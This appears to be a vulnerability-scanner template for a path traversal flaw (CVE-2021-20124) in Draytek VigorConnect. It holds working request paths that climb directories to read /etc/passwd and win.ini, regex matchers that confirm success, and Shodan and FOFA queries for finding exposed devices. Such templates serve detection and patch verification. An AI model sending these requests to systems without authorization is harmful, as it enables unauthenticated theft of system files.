http:
- matchers:
  - part: header
    type: word
    words:
    - application/octet-stream
  - condition: or
    regex:
    - 'root:.*:0:0:'
    - for 16-bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd'
  - '{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini'
  stop-at-first-match: true
id: CVE-2021-20124
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:draytek:vigorconnect:1.6.0:beta3:*:*:*:*:*:*
    cve-id: CVE-2021-20124
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99894
    epss-score: 0.94059
  description: Draytek VigorConnect 1.6.0-B3 is susceptible to local file inclusion
    in the file download functionality of the WebServlet endpoint. An unauthenticated
    attacker could leverage this vulnerability to download arbitrary files from the
    underlying operating system with root privileges.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to sensitive information, potential data leakage, and further compromise
    of the affected system.

    '
  metadata:
    fofa-query: body="vigorconnect"
    max-request: 2
    product: vigorconnect
    shodan-query:
    - http.html:"VigorConnect"
    - http.html:"vigorconnect"
    vendor: draytek
    verified: true
  name: Draytek VigorConnect 6.0-B3 - Local File Inclusion
  reference:
  - https://www.tenable.com/security/research/tra-2021-42
  - https://www.draytek.com/products/vigorconnect/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-20124
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches or updates provided by Draytek to
    fix the LFI vulnerability in VigorConnect 6.0-B3.

    '
  severity: high
  tags: cve2021,cve,draytek,lfi,vigorconnect,tenable,kev,vkev,vuln
